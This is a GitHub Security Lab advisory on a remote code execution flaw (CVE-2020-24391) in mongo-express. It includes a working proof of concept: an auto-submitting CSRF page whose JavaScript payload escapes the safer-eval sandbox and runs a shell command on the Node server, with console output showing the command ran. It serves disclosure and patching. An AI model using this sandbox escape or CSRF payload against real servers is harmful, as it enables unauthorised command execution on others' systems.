<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">April 1, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-131: Remote Code Execution in mongo-express - CVE-2020-24391</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/agustingianni">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/102623?s=35" height="35" width="35">
        <span>Agustin Gianni</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>24/06/2020: Vendor contacted</li>
  <li>24/06/2020: Vendor notified that the issue was fixed on a pre-release branch.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>Mongo-express uses <a href="https://github.com/commenthol/safer-eval">safer-eval</a> to validate user supplied <code class="language-plaintext highlighter-rouge">javascript</code>. Unfortunately <code class="language-plaintext highlighter-rouge">safer-eval</code> sandboxing capabilities are easily bypassed leading to <code class="language-plaintext highlighter-rouge">RCE</code> in the context of the <code class="language-plaintext highlighter-rouge">node</code> server.</p>

<h2 id="product">Product</h2>

<p>mongo-express</p>

<h2 id="tested-version">Tested Version</h2>

<p>v0.54.0</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-rce-by-abusing-safer-eval">Issue 1: RCE by abusing <code class="language-plaintext highlighter-rouge">safer-eval</code></h3>

<p>Mongo-express uses <a href="https://github.com/commenthol/safer-eval">safer-eval</a> to validate user supplied <code class="language-plaintext highlighter-rouge">javascript</code>. Unfortunately <code class="language-plaintext highlighter-rouge">safer-eval</code> sandboxing capabilities are easily bypassed leading to <code class="language-plaintext highlighter-rouge">RCE</code> in the context of the <code class="language-plaintext highlighter-rouge">node</code> server.</p>

<h4 id="impact">Impact</h4>

<p>This issue may lead to <code class="language-plaintext highlighter-rouge">RCE</code>.</p>

<h4 id="resources">Resources</h4>

<p>In order to verify the vulnerability, we have provided a proof of concept that when visited by an authenticated user, it will issue a <code class="language-plaintext highlighter-rouge">POST</code> request automatically without the user noticing. The executed endpoint is <code class="language-plaintext highlighter-rouge">/checkValid</code> which reads <code class="language-plaintext highlighter-rouge">javascript</code> code from the form submission and executes it. With a specially crafted payload, we were able to get a reference to the <code class="language-plaintext highlighter-rouge">process</code> object and thus were able to execute arbitrary commands on the system.</p>

<p>Even though this vulnerability is exploited by taking advantage of the lack of CSRF protection, this is not the only attack vector possible. An attacker with valid user credentials can use this vulnerability to escalate privileges and execute code in the host.</p>

<p>Place the following contents in a file named <code class="language-plaintext highlighter-rouge">index.html</code>.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>

<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>mongo-express<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>

<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"myform"</span> <span class="na">action=</span><span class="s">"http://localhost:8081/checkValid"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"document"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">const</span> <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">myform</span><span class="dl">"</span><span class="p">);</span>

        <span class="c1">// Set the payload.</span>
        <span class="nx">form</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">`
            (() =&gt; {
                const process = clearImmediate.constructor("return process;")();
                const result = process.mainModule.require("child_process").execSync("id");
                console.log("Result: " + result);
                return true;
            })()
        `</span><span class="p">;</span>

        <span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Start a webserver on the same directory where the previous file was created:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
127.0.0.1 - - <span class="o">[</span>22/Jun/2020 15:39:30] <span class="s2">"GET / HTTP/1.1"</span> 200 -
</code></pre></div></div>

<p>Browse to <code class="language-plaintext highlighter-rouge">http://localhost/</code> it is important that there is a currently logged-in user in the target <code class="language-plaintext highlighter-rouge">mongo-express</code> server and that the session has been initiated in the same browser.</p>

<p>By inspecting the <code class="language-plaintext highlighter-rouge">mongo-express</code> console, it can be seen that the request has been made successfully and we have successfully executed the <code class="language-plaintext highlighter-rouge">id</code> command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0] Mongo Express server listening at http://localhost:8081
[0] basicAuth credentials are "admin:pass", it is recommended you change this in your config.js!
[0] Database connected
[0] Connected to local...
[0] Result: uid=501(anon) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae),701(com.apple.sharepoint.group.1)
[0] 
[0] POST /checkValid 200 38.168 ms - 5
</code></pre></div></div>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2020-24391</li>
</ul>

<h2 id="resources-1">Resources</h2>

<ul>
  <li>Fixed by https://github.com/mongo-express/mongo-express/commit/3a26b079e7821e0e209c3ee0cc2ae15ad467b91a</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/agustingianni">@agustingianni (Agustin Gianni)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2020-131</code> in any communication regarding this issue.</p>


    